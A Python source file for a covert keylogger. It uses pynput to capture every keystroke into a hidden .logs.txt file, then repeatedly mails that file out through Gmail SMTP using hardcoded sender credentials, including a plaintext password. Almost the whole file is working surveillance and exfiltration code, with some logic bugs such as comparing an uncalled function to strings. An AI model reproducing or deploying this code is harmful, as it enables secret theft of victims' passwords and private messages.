import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import threading
from tkinter import Checkbutton

from pynput import keyboard
import platform
import getpass

mail_content = "Mail with attachment."
sender_address = 'leodahal44@gmail.com'  # Enter your fake id here.
sender_pass = 'programmerleodahal'  # Original pass of fake id
receiver_address = 'leodahal44@gmail.com'  # Enter the receiver id
attach_file_name = ''
attach_file = ''
message = ''
session = ''


class sendMail:
    global mail_content, sender_address, sender_pass, receiver_address, attach_file, attach_file_name
    global message, session

    @staticmethod
    def sendmailonly(self):
        print("\nERROR\nFile not found.")
        quit(0)

    def sendErrorMail():
        global sender_address, receiver_address, sender_pass
        errorSession = smtplib.SMTP('smtp.gmail.com', 587)
        errorSession.starttls()
        errorSession.login(sender_address, sender_pass)
        sendMail.sendMessage("", errorSession, sender_address, receiver_address)

    def sendMailTimer():
        timer = threading.Timer(60, sendMail.sendMailFucker)
        timer.start()

    def sendMessage(fileText, sessions, sender, receiver):
        try:
            text = fileText
            sessions.sendmail(sender, receiver, text)
            sessions.quit()
            return 1
        except ConnectionError:
            return 0

    def sendMailFucker():
        global message, attach_file, session, mail_content
        try:
            # Setup the MIME
            message = MIMEMultipart()
            message['From'] = sender_address
            message['To'] = receiver_address
            message['Subject'] = 'A test mail sent by Python. It has an attachment.'
            message.attach(MIMEText(mail_content, 'plain'))

            try:
                attach_file = open(".logs.txt", 'rb')  # Open the file as binary mode
            except FileNotFoundError:
                sendMail.sendmailonly("")

            payload = MIMEBase('application', 'octate-stream')
            payload.set_payload(attach_file.read())
            encoders.encode_base64(payload)  # encode the attachment
            # add payload header with filename
            payload.add_header('Content-Decomposition', 'attachment', filename=attach_file_name)
            message.attach(payload)
            # Create SMTP session for sending the mail
            session = smtplib.SMTP('smtp.gmail.com', 587)  # use gmail port
            session.starttls()  # enable security
            session.login(sender_address, sender_pass)  # login
            if sendMail.sendMessage(message.as_string(), session, sender_address, receiver_address):
                pass
            else:
                raise ConnectionError
        except ConnectionError:
            pass


logs = ""


class osrelated:
    def getUserName():
        try:
            userName = getpass.getuser()
            return userName
        except:
            return 0

    def getOs():
        try:
            os = platform.system()
            if os == "Windows":
                return "shit"
            elif os == "Linux":
                print("\nLinux\n")
                return "wow"
            elif os == "Darwin":
                return "mac"
            else:
                return 0
        except:
            return 0


def storeLogs(key):
    global logs
    # logs += str(key)
    # print("Actual is " + str(key))
    # logs += "\n"
    try:
        if "Key" in str(key):
            if "enter" in str(key):
                logs += "\n"
            elif str(key) == "Key.space":
                logs += " "
            elif "backspace" in str(key):
                logs += "<"
            elif "shift" in str(key):
                logs += " SHIFT +"
            elif "ctrl" in str(key):
                logs += " CTRL + "
            else:
                logs += " " + str(key)
                logs += " " + str(key)
                # logs += "\n"
        else:
            strKey = str(key)
            logs += " " + strKey[1:2]
    except AttributeError:
        logs += str(key)
    print("Printed is " + logs)


path = ""


def declarePathForSave():
    global path
    if osrelated.getOs == "shit":
        # windows
        path = "C:\\"
    elif osrelated.getOs == "wow":
        # linux based os
        if osrelated.getUserName():
            path = "/" + osrelated.getUserName() + "/"
            print(path)
        else:
            path = "/"
    elif osrelated.getOs == "mac":
        # mac os
        path = ""
    else:
        # the os couldnot be determined
        path = ""


declarePathForSave()


def saveLogs():
    try:
        global logs, path
        print(path)
        saveFile = open(path + ".logs.txt", "a+")
        saveFile.write(logs)
        logs = "\n"
        saveFile.close()
        sendMail.sendMailFucker()
        saveTimer = threading.Timer(5, saveLogs)
        saveTimer.start()
    except FileNotFoundError:
        sendMail.sendErrorMail()


keyboardListener = keyboard.Listener(on_press=storeLogs)

with keyboardListener:
    saveLogs()
    keyboardListener.join()
